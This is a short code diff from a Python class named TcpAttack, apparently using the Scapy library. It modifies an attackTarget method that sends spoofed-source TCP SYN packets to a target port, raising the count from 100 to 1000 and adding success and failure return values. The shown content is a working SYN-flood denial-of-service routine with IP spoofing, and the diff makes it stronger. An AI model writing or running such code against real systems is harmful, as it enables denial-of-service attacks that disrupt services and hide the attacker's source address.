@@ -24,13 +24,16 @@ class TcpAttack():
             f.write('\n'.join(open_ports))
 
     def attackTarget(self, port):
-        for i in range(100):
-            IP_header= IP(src=self.spoof, dst=self.target)
+        for i in range(1000):
+            IP_header = IP(src=self.spoof, dst=self.target)
             TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)
             packet = IP_header / TCP_header
-            print(type(packet))
             try:
                send(packet)
+               print("Packet send success")
             except Exception as e:
                print(e)
+               return False
+
+        return True
 
